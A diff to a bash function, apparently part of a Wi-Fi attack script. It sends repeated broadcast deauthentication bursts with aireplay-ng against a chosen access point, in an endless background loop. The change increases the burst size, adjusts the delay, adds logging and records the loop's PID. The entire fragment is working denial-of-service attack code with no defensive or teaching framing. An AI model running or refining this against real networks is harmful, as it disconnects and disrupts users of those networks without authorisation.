@@ -36,27 +36,28 @@ start_deauth() {
     local iface=$1
     local target_bssid=$2
     local target_channel=$3
-    local delay=${4:-"10"}  # seconds between deauth bursts
+    local delay=${4:-"15"}  # seconds between deauth bursts
     
-    log "Starting deauthentication attacks on $target_bssid"
+    log "Starting deauthentication attacks on $target_bssid every $delay seconds"
     
     # Loop to continuously send deauth packets
     while true; do
-        # Send 5 deauth packets to broadcast
+        log "Sending deauthentication packets to $target_bssid"
+        
+        # Send 10 deauth packets to broadcast
         aireplay-ng \
-            --deauth 5 \
+            --deauth 10 \
             --channel "$target_channel" \
             -a "$target_bssid" \
             "$iface" \
             >/dev/null 2>&1
         
-        # Send 5 deauth packets to each client (if any clients are captured)
-        # This would require parsing the airodump output to get client MACs
-        # For now, we'll just send broadcast deauths
-        
+        # Wait before next round
         sleep "$delay"
     done &
     
     # Store the PID of the deauth loop
-    echo $! >> "$WORKDIR/deauth.pid"
+    local deauth_pid=$!
+    echo $deauth_pid > "$WORKDIR/deauth.pid"
+    log "Deauthentication process started (PID: $deauth_pid)"
 }
